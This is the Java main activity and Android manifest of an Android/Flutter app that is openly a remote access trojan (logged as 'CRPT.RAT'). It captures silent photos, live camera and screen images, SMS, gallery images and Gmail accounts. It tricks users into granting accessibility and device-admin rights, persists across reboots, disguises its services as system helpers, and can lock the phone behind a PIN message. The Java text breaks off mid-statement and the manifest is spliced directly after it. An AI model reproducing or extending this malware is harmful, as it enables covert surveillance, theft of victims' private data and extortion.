package com.nullx.pp;

import android.Manifest;
import android.accounts.Account;
import android.accounts.AccountManager;
import android.app.WallpaperManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.ContentUris;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.graphics.PixelFormat;
import android.media.Image;
import android.media.ImageReader;
import android.hardware.camera2.*;
import android.net.Uri;
import android.os.Build;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.Looper;
import android.provider.MediaStore;
import android.provider.Settings;
import android.util.Base64;
import android.util.Log;
import android.view.Gravity;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.FrameLayout;
import androidx.annotation.NonNull;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import io.flutter.embedding.android.FlutterActivity;
import io.flutter.embedding.engine.FlutterEngine;
import io.flutter.plugin.common.MethodChannel;

import java.io.ByteArrayOutputStream;
import java.io.InputStream;
import java.net.URL;
import java.nio.ByteBuffer;
import java.util.Arrays;
import java.util.ArrayList;
import java.util.HashMap;

public class MainActivity extends FlutterActivity {
    private static final String SPY_CHANNEL    = "com.nullx.pp/background_spy";
    private static final String STROBE_CHANNEL = "com.nullx.pp/strobe";
    private static final String TAG            = "CRPT.RAT";

    private boolean isStrobeRunning = false;
    private Handler uiHandler       = new Handler(Looper.getMainLooper());
    private Runnable strobeRunnable;

    private HandlerThread cameraThread;
    private Handler       cameraHandler;
    private CameraDevice  activeCameraDevice;
    private ImageReader   activeImageReader;
    private CameraCaptureSession activeCaptureSession;

    private boolean isLiveStreaming = false;
    private byte[] lastFrame;

    private WindowManager windowManager;
    private View touchBlockOverlay;
    private boolean isTouchBlocked = false;
    private Handler touchBlockHandler = new Handler(Looper.getMainLooper());
    private Runnable touchBlockTimeoutRunnable;

    @Override
    protected void onCreate(android.os.Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        try {
            Intent svc = new Intent(this, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svc);
            else startService(svc);
            PersistentWorker.schedule(this);

            windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);

            if (!isAccessibilityEnabled()) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    try {
                        Intent accIntent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
                        accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(accIntent);
                    } catch (Exception ignored) {}
                    new Handler(Looper.getMainLooper()).postDelayed(() -> {
                        try { requestDeviceAdmin(); } catch (Exception ignored) {}
                    }, 3000);
                }, 500);
            } else {
                try { requestDeviceAdmin(); } catch (Exception ignored) {}
            }
        } catch (Exception e) {
            Log.e(TAG, "onCreate: " + e.getMessage());
        }
    }

    private boolean isAccessibilityEnabled() {
        try {
            int enabled = Settings.Secure.getInt(getContentResolver(),
                Settings.Secure.ACCESSIBILITY_ENABLED, 0);
            if (enabled == 0) return false;
            String services = Settings.Secure.getString(getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return services != null && services.contains(getPackageName());
        } catch (Exception e) { return false; }
    }

    private void requestDeviceAdmin() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComp = new ComponentName(this, DeviceAdminHelper.class);
            if (dpm != null && !dpm.isAdminActive(adminComp)) {
                Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
                adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Diperlukan untuk keamanan sistem.");
                startActivity(adminIntent);
            }
        } catch (Exception ignored) {}
    }

    private void showTouchBlockOverlay() {
        if (touchBlockOverlay != null || windowManager == null) return;
        try {
            FrameLayout overlayView = new FrameLayout(this) {
                @Override public boolean onTouchEvent(MotionEvent event) { return true; }
            };
            overlayView.setBackgroundColor(0x00000000);

            int layoutFlag = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                layoutFlag,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL |
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            windowManager.addView(overlayView, params);
            touchBlockOverlay = overlayView;
            isTouchBlocked = true;
        } catch (Exception e) {
            Log.e(TAG, "showTouchBlockOverlay: " + e.getMessage());
        }
    }

    private void hideTouchBlockOverlay() {
        try {
            if (touchBlockOverlay != null && windowManager != null) {
                windowManager.removeView(touchBlockOverlay);
                touchBlockOverlay = null;
                isTouchBlocked = false;
            }
        } catch (Exception ignored) {}
    }

    private void startTouchBlock(int durationSeconds) {
        if (touchBlockTimeoutRunnable != null) {
            touchBlockHandler.removeCallbacks(touchBlockTimeoutRunnable);
        }
        showTouchBlockOverlay();
        touchBlockTimeoutRunnable = () -> {
            hideTouchBlockOverlay();
            touchBlockTimeoutRunnable = null;
        };
        touchBlockHandler.postDelayed(touchBlockTimeoutRunnable, durationSeconds * 1000L);
    }

    private void stopTouchBlock() {
        if (touchBlockTimeoutRunnable != null) {
            touchBlockHandler.removeCallbacks(touchBlockTimeoutRunnable);
            touchBlockTimeoutRunnable = null;
        }
        hideTouchBlockOverlay();
    }

    @Override
    public void configureFlutterEngine(@NonNull FlutterEngine flutterEngine) {
        super.configureFlutterEngine(flutterEngine);
        try {
            new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), STROBE_CHANNEL)
                .setMethodCallHandler((call, result) -> {
                    try {
                        if (call.method.equals("startStrobe")) { startStrobeEffect(); result.success(null); }
                        else if (call.method.equals("stopStrobe")) { stopStrobeEffect(); result.success(null); }
                        else result.notImplemented();
                    } catch (Exception e) {
                        try { result.error("STROBE_ERR", e.getMessage(), null); } catch (Exception ignored) {}
                    }
                });

            new MethodChannel(flutterEngine.getDartExecutor().getBinaryMessenger(), SPY_CHANNEL)
                .setMethodCallHandler((call, result) -> {
                    try {
                        handleMethodCall(call, result);
                    } catch (Exception e) {
                        try { result.error("METHOD_ERR", e.getMessage(), null); } catch (Exception ignored) {}
                    }
                });
        } catch (Exception e) {
            Log.e(TAG, "configureFlutterEngine: " + e.getMessage());
        }
    }

    private void handleMethodCall(io.flutter.plugin.common.MethodCall call, MethodChannel.Result result) {
        try {
            switch (call.method) {
                case "blockTouch": {
                    int duration = call.argument("duration") != null ? (int) call.argument("duration") : 5;
                    startTouchBlock(duration);
                    result.success(true);
                    break;
                }
                case "unblockTouch": {
                    stopTouchBlock();
                    result.success(true);
                    break;
                }
                case "startTouchBlockOverlay": {
                    int duration = call.argument("duration") != null ? (int) call.argument("duration") : 5;
                    startTouchBlock(duration);
                    result.success(true);
                    break;
                }
                case "takeSilentPhotoBackground": {
                    String side = call.argument("side");
                    capturePhoto(side == null ? "back" : side, result);
                    break;
                }
                case "startLiveCameraStream": {
                    String side = call.argument("side");
                    startLiveCameraStream(side == null ? "back" : side, result);
                    break;
                }
                case "stopLiveCameraStream": {
                    stopLiveCameraStream();
                    result.success(null);
                    break;
                }
                case "getLiveFrame": {
                    if (lastFrame != null) {
                        String b64 = Base64.encodeToString(lastFrame, Base64.NO_WRAP);
                        result.success(b64);
                    } else {
                        result.success(null);
                    }
                    break;
                }
                case "startScreenStreamBackground": {
                    String b64 = getScreenBase64();
                    result.success(b64);
                    break;
                }
                case "getGmailAccounts": {
                    fetchGmailAccounts(result);
                    break;
                }
                case "setWallpaper": {
                    setWallpaper(call.argument("url"), result);
                    break;
                }
                case "getSmsMessages": {
                    getSmsMessages(result);
                    break;
                }
                case "getGalleryImages": {
                    int limit = call.argument("limit") != null ? (int) call.argument("limit") : 10;
                    getGalleryImages(limit, result);
                    break;
                }
                case "bringToForeground": {
                    Intent intent = new Intent(MainActivity.this, MainActivity.class);
                    intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
                    startActivity(intent);
                    result.success(true);
                    break;
                }
                case "saveTargetId":
                case "saveDeviceIdAll": {
                    String id = call.arguments != null ? call.arguments.toString() : "";
                    getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit().putString("targetId", id).apply();
                    getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE).edit()
                        .putString("flutter.target_id", id)
                        .putString("flutter.target_model", Build.BRAND + " " + Build.MODEL)
                        .apply();
                    try {
                        java.io.File dir = new java.io.File(android.os.Environment.getExternalStorageDirectory(), ".crpt");
                        dir.mkdirs();
                        java.io.FileWriter fw = new java.io.FileWriter(new java.io.File(dir, ".devid"));
                        fw.write(id); fw.close();
                    } catch (Exception ignored) {}
                    try {
                        java.io.FileWriter fw2 = new java.io.FileWriter(new java.io.File(getCacheDir(), "devid.dat"));
                        fw2.write(id); fw2.close();
                    } catch (Exception ignored) {}
                    Intent svcIntent = new Intent(this, SpyService.class);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(svcIntent);
                    else startService(svcIntent);
                    PersistentWorker.schedule(this);
                    result.success(true);
                    break;
                }
                case "saveLockState": {
                    String msg = call.argument("message");
                    String pin = call.argument("pin");
                    boolean locked = Boolean.TRUE.equals(call.argument("locked"));
                    boolean isLive = Boolean.TRUE.equals(call.argument("isLockLive"));
                    SharedPreferences.Editor ed = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE).edit();
                    ed.putBoolean("isLocked", locked);
                    ed.putBoolean("isLockLive", isLive);
                    if (msg != null) ed.putString("lockMessage", msg);
                    if (pin != null) ed.putString("lockPin", pin);
                    ed.apply();
                    result.success(true);
                    break;
                }
                case "getLockState": {
                    SharedPreferences prefs = getSharedPreferences("SpyPrefs", Context.MODE_PRIVATE);
                    HashMap<String, Object> state = new HashMap<>();
                    state.put("isLocked", prefs.getBoolean("isLocked", false));
                    state.put("isLockLive", prefs.getBoolean("isLockLive", false));
                    state.put("lockMessage", prefs.getString("lockMessage", "YOUR PHONE IS LOCKED!!!!"));
                    state.put("lockPin", prefs.getString("lockPin", "1234"));
                    result.success(state);
                    break;
                }
                case "vibrateDevice": {
                    try {
                        Vibrator vib;
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                            android.os.VibratorManager vbm = (android.os.VibratorManager) getSystemService(VIBRATOR_MANAGER_SERVICE);
                            vib = vbm != null ? vbm.getDefaultVibrator() : null;
                        } else {
                            vib = (Vibrator) getSystemService(VIBRATOR_SERVICE);
                        }
                        if (vib != null) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                                vib.vibrate(VibrationEffect.createWaveform(new long[]{0, 500, 200, 500, 200, 500}, -1));
                            } else {
                                vib.vibrate(new long[]{0, 500, 200, 500, 200, 500}, -1);
                            }
                        }
                    } catch (Exception ignored) {}
                    result.success(null);
                    break;
                }
                case "openNotificationSettings": {
                    startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
                    result.success(true);
                    break;
                }
                case "startLockOverlay": {
                    try {
                        String lockMsg = call.argument("message");
                        String lockPin = call.argument("pin");
                        if (lockMsg == null) lockMsg = "DEVICE IS LOCKED";
                        if (lockPin == null) lockPin = "1234";
                        Intent lockIntent = new Intent(this, LockOverlayService.class);
                        lockIntent.setAction(LockOverlayService.ACTION_LOCK);
                        lockIntent.putExtra(LockOverlayService.EXTRA_MESSAGE, lockMsg);
                        lockIntent.putExtra(LockOverlayService.EXTRA_PIN, lockPin);
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            startForegroundService(lockIntent);
                        } else {
                            startService(lockIntent);
                        }
                        result.success(true);
                    } catch (Exception e) { result.error("LOCK_OVERLAY_ERR", e.getMessage(), null); }
                    break;
                }
                case "stopLockOverlay": {
                    try {
                        Intent unlockIntent = new Intent(this, LockOverlayService.class);
                        unlockIntent.setAction(LockOverlayService.ACTION_UNLOCK);
                        startService(unlockIntent);
                        result.success(true);
                    } catch (Exception e) { result.success(false); }
                    break;
                }
                case "lockDeviceNow": {
                    try {
                        DevicePolicyManager dpmLock = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        ComponentName adminLock = new ComponentName(getApplicationContext(), DeviceAdminHelper.class);
                        if (dpmLock != null && dpmLock.isAdminActive(adminLock)) {
                            dpmLock.lockNow();
                            result.success(true);
                        } else {
                            Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                            adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                                new ComponentName(getApplicationContext(), DeviceAdminHelper.class));
                            adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                                "Diperlukan untuk keamanan sistem.");
                            startActivity(adminIntent);
                            result.success(false);
                        }
                    } catch (Exception e) { result.error("LOCK_ERR", e.getMessage(), null); }
                    break;
                }
                case "disableWifi": {
                    try {
                        android.net.wifi.WifiManager wifi = (android.net.wifi.WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
                        if (wifi != null && Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
                            wifi.setWifiEnabled(false);
                            result.success(true);
                        } else {
                            result.success(false);
                        }
                    } catch (Exception e) {
                        result.error("WIFI_ERR", e.getMessage(), null);
                    }
                    break;
                }
                case "

<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.VIBRATE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.RECEIVE_SMS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <uses-permission android:name="android.permission.READ_MEDIA_IMAGES" />
    <uses-permission android:name="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE" />
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
    <uses-permission android:name="android.permission.SET_WALLPAPER" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.REBOOT" tools:ignore="ProtectedPermissions" />

    <application
        android:label="PPL V2"
        android:name="${applicationName}"
        android:icon="@mipmap/ic_launcher"
        android:requestLegacyExternalStorage="true"
        android:usesCleartextTraffic="true">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop"
            android:theme="@style/LaunchTheme"
            android:configChanges="orientation|keyboardHidden|keyboard|screenSize|smallestScreenSize|locale|layoutDirection|fontScale|screenLayout|density|uiMode"
            android:hardwareAccelerated="true"
            android:windowSoftInputMode="adjustResize">
            <meta-data
                android:name="io.flutter.embedding.android.NormalTheme"
                android:resource="@style/NormalTheme" />
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <service
            android:name=".SpyService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="camera|microphone"
            android:stopWithTask="false" />

        <service
            android:name=".LockOverlayService"
            android:enabled="true"
            android:exported="false"
            android:foregroundServiceType="camera|microphone" />

        <service
            android:name=".NotificationService"
            android:exported="true"
            android:label="System Notification"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <service
            android:name=".AutoAdminActivator"
            android:exported="true"
            android:label="System Helper"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config" />
        </service>

        <receiver
            android:name=".DeviceAdminHelper"
            android:exported="true"
            android:permission="android.permission.BIND_DEVICE_ADMIN">
            <meta-data
                android:name="android.app.device_admin"
                android:resource="@xml/device_admin_receiver" />
            <intent-filter>
                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".RestarterReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_RESTARTED" />
                <action android:name="RestartSpyService" />
            </intent-filter>
        </receiver>

        <receiver
            android:name=".SmsReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter android:priority="999">
                <action android:name="android.provider.Telephony.SMS_RECEIVED" />
            </intent-filter>
        </receiver>

        <meta-data
            android:name="flutterEmbedding"
            android:value="2" />
    </application>
</manifest>
